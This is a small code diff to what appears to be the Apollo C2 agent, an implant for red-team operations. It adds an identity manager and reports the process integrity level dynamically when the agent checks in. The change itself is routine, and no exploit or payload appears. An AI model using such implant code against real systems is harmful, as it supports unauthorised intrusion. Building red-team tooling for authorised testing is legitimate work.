@@ -28,6 +28,7 @@ namespace Apollo.Agent
             SocksManager = new AM.Socks.SocksManager(this);
             TaskManager = new AM.Tasks.TaskManager(this);
             FileManager = new AM.Files.FileManager(this);
+            IdentityManager = new AM.Identity.IdentityManager(this);
 
             foreach (string profileName in Config.EgressProfiles.Keys)
             {
@@ -109,7 +110,7 @@ namespace Apollo.Agent
                 Architecture = IntPtr.Size == 8 ? "x64" : "x86",
                 Domain = Environment.UserDomainName,
                 // Modify this later.
-                IntegrityLevel = IntegrityLevel.MediumIntegrity,
+                IntegrityLevel = IdentityManager.GetIntegrityLevel(),
                 ExternalIP = "",
             };
             IC2Profile connectProfile = null;
